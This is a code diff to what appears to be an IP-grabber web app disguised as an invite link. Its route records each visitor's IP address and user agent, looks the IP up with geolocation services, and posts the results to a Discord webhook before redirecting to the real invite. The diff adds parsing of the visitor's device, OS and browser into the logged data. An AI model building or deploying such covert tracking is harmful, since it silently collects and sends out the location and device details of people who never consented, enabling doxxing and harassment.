@@ -6,6 +6,7 @@ import requests
 from threading import Thread
 from dotenv import load_dotenv
 from flask import Flask, request, redirect
+from ua_parser import user_agent_parser
 from services.ip_api import IpApi
 from services.db_ip import DBIP
 
@@ -17,18 +18,43 @@ INVITE_LINK = os.environ.get('INVITE_LINK')
 WEBHOOK_LINK = os.environ.get('WEBHOOK_LINK')
 
 
+def parse_user_agent(user_agent):
+    '''
+    Parses the user agent
+    ### Returns
+    - embed fields containing parsed user agent data
+    '''
+    EMPTY = '_'
+    ua_parser = user_agent_parser.Parse(user_agent)
+
+    fields = []
+
+    fields.append({
+        'name': 'Device',
+        'value': f'Brand: {ua_parser["device"].get("brand", EMPTY)}\nFamily: {ua_parser["device"].get("family", EMPTY)}\nModel: {ua_parser["device"].get("model", EMPTY)}'
+    })
+
+    fields.append({
+        'name': 'OS',
+        'value': f'{ua_parser["os"].get("family")} {ua_parser["os"].get("major", EMPTY)}.{ua_parser["os"].get("minor", EMPTY)}.{ua_parser["os"].get("patch", EMPTY)}'
+    })
+
+    fields.append({
+        'name': 'Browser',
+        'value': f'{ua_parser["user_agent"].get("family", EMPTY)} {ua_parser["user_agent"].get("major", EMPTY)}.{ua_parser["user_agent"].get("minor", EMPTY)}.{ua_parser["user_agent"].get("patch", EMPTY)}'
+    })
+
+    return fields
+
+
 def post_ip(ip_addr, user_agent):
     '''
     Posts the ip to discord
     '''
-    embed = {
+    ua_embed = {
         'title': 'Invite IP Log',
         'description': f'Invited to {INVITE_LINK}',
         'fields': [
-            {
-                'name': 'IP',
-                'value': ip_addr
-            },
             {
                 'name': 'User Agent',
                 'value': user_agent
@@ -36,13 +62,31 @@ def post_ip(ip_addr, user_agent):
         ]
     }
 
+    try:
+        ua_embed['fields'].extend(parse_user_agent(user_agent))
+    except Exception as e:
+        print('Error while parsing user agent:', e)
+
+    ip_embed = {
+        'description': 'IP lookup data',
+        'fields': [
+            {
+                'name': 'IP',
+                'value': ip_addr
+            }
+        ]
+    }
+
     for service in services:
-        embed['fields'].append(service(ip_addr).lookup_ip())
+        try:
+            ip_embed['fields'].append(service(ip_addr).lookup_ip())
+        except Exception as e:
+            print(f'Error while looking up ip using {IpApi.__name__}:', e)
 
     try:
-        requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)
+        requests.post(WEBHOOK_LINK, json={'embeds': [ua_embed, ip_embed]}, timeout=10)
     except Exception as e:
-        print(e)
+        print('Error while posting data:', e)
 
 
 @app.route('/')
@@ -58,7 +102,8 @@ def invite():
     else:
         ip_addr = request.remote_addr
 
-    Thread(target=post_ip, args=(ip_addr, request.headers.get('User-Agent'))).start()
+    Thread(target=post_ip, args=(
+        ip_addr, request.headers.get('User-Agent'))).start()
 
     return redirect(INVITE_LINK)
 
